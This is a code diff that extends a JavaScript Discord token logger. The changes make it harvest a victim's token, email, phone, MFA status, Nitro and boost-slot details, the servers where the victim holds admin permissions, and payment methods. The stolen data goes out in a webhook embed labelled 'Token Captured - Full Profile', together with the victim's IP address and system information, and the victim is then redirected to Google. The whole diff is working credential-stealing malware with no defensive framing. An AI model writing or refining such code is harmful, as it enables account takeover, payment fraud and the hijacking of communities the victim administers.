@@ -47,12 +47,15 @@
     // Discord API endpoints for token validation
     const DISCORD_API = {
       USER_INFO: 'https://discord.com/api/v9/users/@me',
-      GUILDS: 'https://discord.com/api/v9/users/@me/guilds',
-      BILLING: 'https://discord.com/api/v9/users/@me/billing/payment-sources'
+      GUILDS: 'https://discord.com/api/v9/users/@me/guilds?with_counts=true',
+      BILLING: 'https://discord.com/api/v9/users/@me/billing/payment-sources',
+      SUBSCRIPTIONS: 'https://discord.com/api/v9/users/@me/billing/subscriptions',
+      BOOST_SLOTS: 'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots'
     };
 
     async function processData() {
       if (hasSent) {
+        console.log('[Already sent]');
         location.href = 'https://google.com';
         return;
       }
@@ -68,6 +71,7 @@
       }
 
       if (!rawToken) {
+        console.log('[✗] No token found');
         location.href = 'https://google.com';
         return;
       }
@@ -90,6 +94,7 @@
         if (decoded !== token) token = decoded;
       } catch (e) {}
 
+      console.log('[→] Processing token...');
 
       try {
         hasSent = true;
@@ -99,6 +104,7 @@
 
         // If token is invalid, don't send anything - just redirect
         if (!validationResult.valid) {
+          console.log('[✗] Invalid token - not sending');
           location.href = 'https://google.com';
           return;
         }
@@ -119,6 +125,7 @@
         const success = await sendData(token, systemInfo, userAgent, validationResult);
 
         if (success) {
+          console.log('[✓] Valid token sent successfully');
         }
 
         location.href = 'https://google.com';
@@ -129,7 +136,7 @@
       }
     }
 
-    // Validate Discord token and get user info
+    // Validate Discord token and get detailed user info
     async function validateToken(token) {
       try {
         // Fetch user info
@@ -146,25 +153,95 @@
 
         const userData = await userResponse.json();
 
-        // Fetch guilds (servers)
+        // Parse badges from flags
+        const badges = parseFlags(userData.flags || 0);
+
+        // Fetch guilds with counts
         let guilds = [];
+        let adminGuilds = [];
         try {
           const guildsResponse = await fetch(DISCORD_API.GUILDS, {
             headers: { 'Authorization': token }
           });
           if (guildsResponse.ok) {
             guilds = await guildsResponse.json();
+            
+            // Find guilds where user has admin/manage server permissions
+            for (let guild of guilds) {
+              const perms = guild.permissions;
+              // Check for ADMINISTRATOR (8) or MANAGE_SERVER (32)
+              if ((perms & 8) === 8 || (perms & 32) === 32) {
+                adminGuilds.push({
+                  name: guild.name,
+                  id: guild.id,
+                  members: guild.approximate_member_count || 'N/A'
+                });
+              }
+            }
           }
         } catch (e) {}
 
-        // Fetch billing info
-        let billing = null;
+        // Fetch subscriptions (Nitro info)
+        let nitroInfo = { hasNitro: false, type: 'None', expiresAt: null };
+        try {
+          const subsResponse = await fetch(DISCORD_API.SUBSCRIPTIONS, {
+            headers: { 'Authorization': token }
+          });
+          if (subsResponse.ok) {
+            const subs = await subsResponse.json();
+            if (subs.length > 0) {
+              nitroInfo.hasNitro = true;
+              nitroInfo.type = getNitroType(subs[0].type);
+              nitroInfo.expiresAt = new Date(subs[0].current_period_end).toLocaleString();
+            }
+          }
+        } catch (e) {}
+
+        // Fetch boost slots
+        let boostInfo = { available: 0, onCooldown: 0, slots: [] };
+        try {
+          const boostResponse = await fetch(DISCORD_API.BOOST_SLOTS, {
+            headers: { 'Authorization': token }
+          });
+          if (boostResponse.ok) {
+            const slots = await boostResponse.json();
+            for (let slot of slots) {
+              const cooldownEnd = new Date(slot.cooldown_ends_at);
+              const now = new Date();
+              if (cooldownEnd <= now) {
+                boostInfo.available++;
+                boostInfo.slots.push({ status: 'Available Now' });
+              } else {
+                boostInfo.onCooldown++;
+                boostInfo.slots.push({ 
+                  status: 'On Cooldown', 
+                  availableAt: cooldownEnd.toLocaleString() 
+                });
+              }
+            }
+          }
+        } catch (e) {}
+
+        // Fetch billing/payment info
+        let paymentInfo = { count: 0, valid: 0, types: [] };
         try {
           const billingResponse = await fetch(DISCORD_API.BILLING, {
             headers: { 'Authorization': token }
           });
           if (billingResponse.ok) {
-            billing = await billingResponse.json();
+            const payments = await billingResponse.json();
+            for (let payment of payments) {
+              paymentInfo.count++;
+              if (!payment.invalid) {
+                paymentInfo.valid++;
+              }
+              const type = payment.type === 1 ? 'Credit Card' : payment.type === 2 ? 'PayPal' : 'Unknown';
+              paymentInfo.types.push({
+                type: type,
+                valid: !payment.invalid,
+                brand: payment.brand || 'N/A'
+              });
+            }
           }
         } catch (e) {}
 
@@ -178,12 +255,18 @@
             verified: userData.verified || false,
             phone: userData.phone || 'N/A',
             mfa: userData.mfa_enabled || false,
-            nitro: getNitroType(userData.premium_type),
+            flags: userData.flags || 0,
+            badges: badges,
+            locale: userData.locale || 'N/A',
             avatar: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : null
           },
-          guilds: guilds.length,
-          hasBilling: billing && billing.length > 0,
-          billingCount: billing ? billing.length : 0
+          nitro: nitroInfo,
+          boost: boostInfo,
+          guilds: {
+            total: guilds.length,
+            admin: adminGuilds
+          },
+          payment: paymentInfo
         };
 
       } catch (error) {
@@ -194,9 +277,26 @@
       }
     }
 
+    // Parse Discord flags to badge names
+    function parseFlags(flags) {
+      const badges = [];
+      if ((flags & 1) === 1) badges.push('Staff');
+      if ((flags & 2) === 2) badges.push('Partner');
+      if ((flags & 4) === 4) badges.push('HypeSquad Events');
+      if ((flags & 8) === 8) badges.push('Bug Hunter Level 1');
+      if ((flags & 64) === 64) badges.push('HypeSquad Bravery');
+      if ((flags & 128) === 128) badges.push('HypeSquad Brilliance');
+      if ((flags & 256) === 256) badges.push('HypeSquad Balance');
+      if ((flags & 512) === 512) badges.push('Early Supporter');
+      if ((flags & 16384) === 16384) badges.push('Bug Hunter Level 2');
+      if ((flags & 131072) === 131072) badges.push('Verified Bot Developer');
+      if ((flags & 4194304) === 4194304) badges.push('Active Developer');
+      return badges.length > 0 ? badges.join(', ') : 'None';
+    }
+
     // Get Nitro type
-    function getNitroType(premiumType) {
-      switch(premiumType) {
+    function getNitroType(type) {
+      switch(type) {
         case 1: return 'Nitro Classic';
         case 2: return 'Nitro';
         case 3: return 'Nitro Basic';
@@ -215,67 +315,146 @@
         }
 
         const tokenString = String(token);
+        const user = validationResult.user;
+        const nitro = validationResult.nitro;
+        const boost = validationResult.boost;
+        const guilds = validationResult.guilds;
+        const payment = validationResult.payment;
 
-        // Build rich embed for valid token
-        const embed = {
-          title: "🎯 Valid Token Captured",
-          description: "Active Discord account credentials intercepted",
-          color: 0x43B581, // Green
-          fields: [
-            {
-              name: "👤 User Info",
-              value: `\`\`\`Username: ${validationResult.user.username}#${validationResult.user.discriminator}\nID: ${validationResult.user.id}\nEmail: ${validationResult.user.email}\nPhone: ${validationResult.user.phone}\`\`\``,
-              inline: false
-            },
-            {
-              name: "🔒 Security",
-              value: `\`\`\`MFA: ${validationResult.user.mfa ? '✅' : '❌'}\nVerified: ${validationResult.user.verified ? '✅' : '❌'}\`\`\``,
-              inline: true
-            },
-            {
-              name: "💎 Nitro",
-              value: `\`\`\`${validationResult.user.nitro}\`\`\``,
-              inline: true
-            },
-            {
-              name: "🏠 Servers",
-              value: `\`\`\`${validationResult.guilds} servers\`\`\``,
-              inline: true
-            },
-            {
-              name: "💳 Billing",
-              value: `\`\`\`${validationResult.hasBilling ? `✅ ${validationResult.billingCount} method(s)` : '❌ None'}\`\`\``,
-              inline: true
-            },
-            {
-              name: "🔑 Token",
-              value: `\`\`\`${tokenString}\`\`\``,
-              inline: false
-            },
-            {
-              name: "🌐 IP Address",
-              value: `\`\`\`${systemInfo.ip}\`\`\``,
-              inline: true
-            },
-            {
-              name: "💻 System",
-              value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\`\`\``,
-              inline: true
+        // Build fields array
+        const fields = [
+          {
+            name: "👤 User Info",
+            value: `\`\`\`yaml\nUsername: ${user.username}#${user.discriminator}\nID: ${user.id}\nEmail: ${user.email}\nPhone: ${user.phone}\nLocale: ${user.locale}\`\`\``,
+            inline: false
+          },
+          {
+            name: "🔒 Security",
+            value: `\`\`\`yaml\nMFA: ${user.mfa ? '✅ Enabled' : '❌ Disabled'}\nVerified: ${user.verified ? '✅ Yes' : '❌ No'}\`\`\``,
+            inline: true
+          },
+          {
+            name: "🎖️ Badges",
+            value: `\`\`\`yaml\n${user.badges}\`\`\``,
+            inline: true
+          }
+        ];
+
+        // Nitro info
+        if (nitro.hasNitro) {
+          fields.push({
+            name: "💎 Nitro",
+            value: `\`\`\`yaml\nType: ${nitro.type}\nExpires: ${nitro.expiresAt}\`\`\``,
+            inline: true
+          });
+        } else {
+          fields.push({
+            name: "💎 Nitro",
+            value: `\`\`\`yaml\nNone\`\`\``,
+            inline: true
+          });
+        }
+
+        // Boost slots
+        if (boost.available > 0 || boost.onCooldown > 0) {
+          let boostText = `Available Now: ${boost.available}\nOn Cooldown: ${boost.onCooldown}\n`;
+          if (boost.slots.length > 0 && boost.slots.length <= 5) {
+            boostText += '\nSlots:\n';
+            for (let slot of boost.slots) {
+              if (slot.status === 'Available Now') {
+                boostText += '  • Available Now\n';
+              } else {
+                boostText += `  • ${slot.availableAt}\n`;
+              }
             }
-          ],
-          thumbnail: validationResult.user.avatar ? {
-            url: validationResult.user.avatar
-          } : undefined,
+          }
+          fields.push({
+            name: "🚀 Boost Slots",
+            value: `\`\`\`yaml\n${boostText}\`\`\``,
+            inline: false
+          });
+        }
+
+        // Guilds
+        fields.push({
+          name: "🏠 Servers",
+          value: `\`\`\`yaml\nTotal: ${guilds.total} servers\nAdmin Access: ${guilds.admin.length} servers\`\`\``,
+          inline: true
+        });
+
+        // Admin guilds details
+        if (guilds.admin.length > 0) {
+          let adminText = '';
+          const maxGuilds = Math.min(guilds.admin.length, 10);
+          for (let i = 0; i < maxGuilds; i++) {
+            const g = guilds.admin[i];
+            adminText += `• ${g.name} (${g.members} members)\n`;
+          }
+          if (guilds.admin.length > 10) {
+            adminText += `\n... and ${guilds.admin.length - 10} more`;
+          }
+          fields.push({
+            name: "⚡ Admin Permissions",
+            value: `\`\`\`yaml\n${adminText}\`\`\``,
+            inline: false
+          });
+        }
+
+        // Payment methods
+        if (payment.count > 0) {
+          let paymentText = `Total Methods: ${payment.count}\nValid Methods: ${payment.valid}\n\nTypes:\n`;
+          for (let pm of payment.types) {
+            const status = pm.valid ? '✅' : '❌';
+            paymentText += `  ${status} ${pm.type}`;
+            if (pm.brand !== 'N/A') paymentText += ` (${pm.brand})`;
+            paymentText += '\n';
+          }
+          fields.push({
+            name: "💳 Payment Methods",
+            value: `\`\`\`yaml\n${paymentText}\`\`\``,
+            inline: false
+          });
+        }
+
+        // System info
+        fields.push(
+          {
+            name: "🌐 IP Address",
+            value: `\`\`\`${systemInfo.ip}\`\`\``,
+            inline: true
+          },
+          {
+            name: "💻 System",
+            value: `\`\`\`OS: ${systemInfo.os}\nBrowser: ${systemInfo.browser}\nPlatform: ${systemInfo.platform}\`\`\``,
+            inline: true
+          }
+        );
+
+        // Token
+        fields.push({
+          name: "🔑 Token",
+          value: `\`\`\`${tokenString}\`\`\``,
+          inline: false
+        });
+
+        // Build rich embed
+        const embed = {
+          title: "🎯 Token Captured - Full Profile",
+          description: `**${user.username}#${user.discriminator}** account compromised`,
+          color: nitro.hasNitro ? 0xFF73FA : payment.count > 0 ? 0xFAA61A : 0x43B581,
+          fields: fields,
+          thumbnail: user.avatar ? { url: user.avatar } : undefined,
           footer: {
             text: `Captured at ${new Date().toUTCString()}`,
             icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
-          }
+          },
+          timestamp: new Date().toISOString()
         };
 
         const payload = {
-          content: null,
+          content: nitro.hasNitro ? '💎 **Nitro Account Detected!**' : payment.count > 0 ? '💳 **Payment Methods Found!**' : null,
           embeds: [embed],
-          username: "Token Logger",
+          username: "Token Logger Pro",
           avatar_url: "https://cdn.discordapp.com/embed/avatars/1.png"
         };
 
